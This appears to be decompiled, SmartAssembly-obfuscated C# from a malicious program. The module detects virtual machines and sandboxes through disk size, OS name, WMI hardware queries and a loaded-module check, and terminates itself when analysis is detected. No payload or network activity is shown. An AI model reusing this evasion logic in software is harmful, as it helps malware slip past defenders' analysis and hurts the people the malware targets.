using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

internal sealed class qYgNeADkcjABMs
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void xYBPOMMCJXmJ()
	{
		if (uXPmqMwkfFViY() || IwAdiovnlJTsVZ() || tpQlwQDGYuau() || ojgwWkNVRyz())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool tpQlwQDGYuau()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool ojgwWkNVRyz()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107401990)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool uXPmqMwkfFViY()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107401985));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107401968)).ToString()!.ToLower();
							if ((text == getString_0(107401919) && current.get_Item(getString_0(107401890)).ToString()!.ToUpperInvariant().Contains(getString_0(107401881))) || text.Contains(getString_0(107401900)) || current.get_Item(getString_0(107401890)).ToString() == getString_0(107402371))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool IwAdiovnlJTsVZ()
	{
		try
		{
			if (GetModuleHandle(getString_0(107402386)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	static qYgNeADkcjABMs()
	{
		Strings.CreateGetStringDelegate(typeof(qYgNeADkcjABMs));
	}
}
